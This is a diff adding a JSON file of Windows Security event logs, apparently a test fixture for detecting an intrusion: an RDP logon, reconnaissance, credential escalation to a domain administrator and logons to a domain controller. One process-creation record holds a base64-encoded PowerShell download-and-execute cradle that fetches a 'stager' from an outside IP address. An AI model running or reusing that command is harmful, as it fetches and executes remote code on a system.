@@ -1,0 +1,108 @@
+[
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-03-10T14:20:00.000Z",
+    "Computer": "WORKSTATION01",
+    "Channel": "Security",
+    "EventData": {
+      "TargetUserName": "jsmith",
+      "TargetDomainName": "CORP",
+      "LogonType": "3",
+      "IpAddress": "10.0.1.105",
+      "IpPort": "49301",
+      "WorkstationName": "WORKSTATION01",
+      "LogonProcessName": "NtLmSsp",
+      "AuthenticationPackageName": "NTLM",
+      "ProcessName": "C:\\Windows\\System32\\svchost.exe"
+    }
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-03-10T14:22:00.000Z",
+    "Computer": "WORKSTATION01",
+    "Channel": "Security",
+    "EventData": {
+      "TargetUserName": "admin_svc",
+      "TargetDomainName": "CORP",
+      "LogonType": "10",
+      "IpAddress": "10.0.1.105",
+      "IpPort": "3389",
+      "WorkstationName": "WORKSTATION01",
+      "LogonProcessName": "User32",
+      "AuthenticationPackageName": "Negotiate",
+      "ProcessName": "C:\\Windows\\System32\\winlogon.exe"
+    }
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-03-10T14:23:00.000Z",
+    "Computer": "WORKSTATION01",
+    "Channel": "Security",
+    "EventData": {
+      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
+      "ParentProcessName": "C:\\Windows\\System32\\winlogon.exe",
+      "SubjectUserName": "admin_svc",
+      "SubjectDomainName": "CORP",
+      "CommandLine": "cmd.exe /c whoami"
+    }
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-03-10T14:24:30.000Z",
+    "Computer": "WORKSTATION01",
+    "Channel": "Security",
+    "EventData": {
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+      "SubjectUserName": "admin_svc",
+      "SubjectDomainName": "CORP",
+      "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAxADQAMwAuADIAMgAzAC4ANAA3AC8AcwB0AGEAZwBlAHIAJwApAA=="
+    }
+  },
+  {
+    "EventID": 4648,
+    "TimeCreated": "2026-03-10T14:28:00.000Z",
+    "Computer": "WORKSTATION01",
+    "Channel": "Security",
+    "EventData": {
+      "SubjectUserName": "admin_svc",
+      "SubjectDomainName": "CORP",
+      "TargetUserName": "domain_admin",
+      "TargetDomainName": "CORP",
+      "TargetServerName": "DC01",
+      "ProcessName": "C:\\Windows\\System32\\runas.exe"
+    }
+  },
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-03-10T14:29:00.000Z",
+    "Computer": "DC01",
+    "Channel": "Security",
+    "EventData": {
+      "TargetUserName": "domain_admin",
+      "TargetDomainName": "CORP",
+      "LogonType": "3",
+      "IpAddress": "10.0.1.50",
+      "FailureReason": "%%2313",
+      "Status": "0xC000006D",
+      "SubStatus": "0xC000006A"
+    }
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-03-10T14:32:00.000Z",
+    "Computer": "DC01",
+    "Channel": "Security",
+    "EventData": {
+      "TargetUserName": "domain_admin",
+      "TargetDomainName": "CORP",
+      "LogonType": "3",
+      "IpAddress": "10.0.1.50",
+      "IpPort": "55200",
+      "WorkstationName": "WORKSTATION01",
+      "LogonProcessName": "Kerberos",
+      "AuthenticationPackageName": "Kerberos",
+      "ProcessName": "-"
+    }
+  }
+]
